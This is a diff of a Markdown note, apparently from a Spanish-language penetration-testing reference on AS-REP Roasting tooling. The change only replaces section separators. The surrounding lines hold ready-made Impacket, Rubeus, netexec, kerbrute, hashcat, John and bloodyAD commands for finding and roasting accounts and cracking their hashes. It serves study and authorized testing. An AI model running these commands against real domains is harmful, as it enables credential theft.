@@ -21,7 +21,7 @@ linked:
 ---
 # AS-REP Roasting - Tooling
 
-***
+---
 
 ## Impacket-GetNPUsers
 
@@ -35,7 +35,7 @@ linked:
 | `impacket-GetNPUsers corp.local/u:p -target-domain partner.com -dc-ip <DC> -request` | Cross-domain | Cross-trust. |
 ^asrep-tool-impacket
 
-___
+---
 
 ## Rubeus
 
@@ -48,7 +48,7 @@ ___
 | `Rubeus.exe asreproast /format:john /outfile:h.txt` | John format | Alt cracker. |
 ^asrep-tool-rubeus
 
-___
+---
 
 ## netexec / crackmapexec
 
@@ -60,7 +60,7 @@ ___
 | `nxc ldap <DC> -u u -p p --asreproastable` | Solo enum (sin roast) | Discovery. |
 ^asrep-tool-nxc
 
-___
+---
 
 ## kerbrute
 
@@ -79,7 +79,7 @@ kerbrute userenum --dc <DC> -d corp.local usernames.txt -o valid.txt
 grep "AS-REP returned" valid.txt | awk '{print $5}' | sed 's/@.*//' > asrep_users.txt
 ```
 
-___
+---
 
 ## hashcat
 
@@ -94,7 +94,7 @@ ___
 
 **Hashcat mode 18200** = Kerberos 5 AS-REP etype 23 (RC4-HMAC). Único mode (no AES variant — AS-REP roast standard RC4).
 
-___
+---
 
 ## John the Ripper
 
@@ -105,7 +105,7 @@ ___
 | `john --format=krb5asrep --show asrep.hash` | Show cracked | Post-run. |
 ^asrep-tool-john
 
-___
+---
 
 ## bloodyAD (Linux)
 
@@ -115,7 +115,7 @@ ___
 | `bloodyAD --host <DC> -d corp -u u -p pass remove uac <victim> -f DONT_REQ_PREAUTH` | Clear flag | Cleanup. |
 ^asrep-tool-bloodyad
 
-___
+---
 
 ## BloodHound Custom Queries
 
@@ -127,7 +127,7 @@ ___
 | `MATCH (u {owned:true})-[:WriteProperty]->(t:User) WHERE NOT t.dontreqpreauth RETURN u,t` | Specific WriteProperty | Targeted. |
 ^asrep-tool-bh
 
-___
+---
 
 ## Recursos
 
@@ -143,4 +143,4 @@ ___
 | MITRE ATT&CK T1558.004 | `https://attack.mitre.org/techniques/T1558/004/` |
 ^asrep-tool-resources
 
-***
+---
